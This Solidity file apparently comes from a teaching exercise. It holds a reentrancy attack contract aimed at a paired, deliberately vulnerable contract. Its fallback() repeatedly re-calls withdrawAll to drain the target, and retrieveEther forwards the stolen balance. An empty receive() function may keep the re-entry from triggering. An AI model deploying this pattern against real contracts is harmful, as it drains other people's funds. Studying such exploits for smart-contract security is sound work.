// SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import "./vuln_contract_1.sol";

contract VulnToReetrancy1Attack {
    VulnToReetrancy1 vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = VulnToReetrancy1(_vulnerableContract);
    }

    // you can use receive() or fallback()
    // order of calling
    // 1. receive
    // 2. fallback

    receive() external payable {}

    fallback() external payable {
        if (address(vulnerableContract).balance > msg.value) {
            vulnerableContract.withdrawAll();
        }
    }

    function initiateAttack() external payable {
        vulnerableContract.deposit{value: msg.value}();
        vulnerableContract.withdrawAll();
    }

    function retrieveEther() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
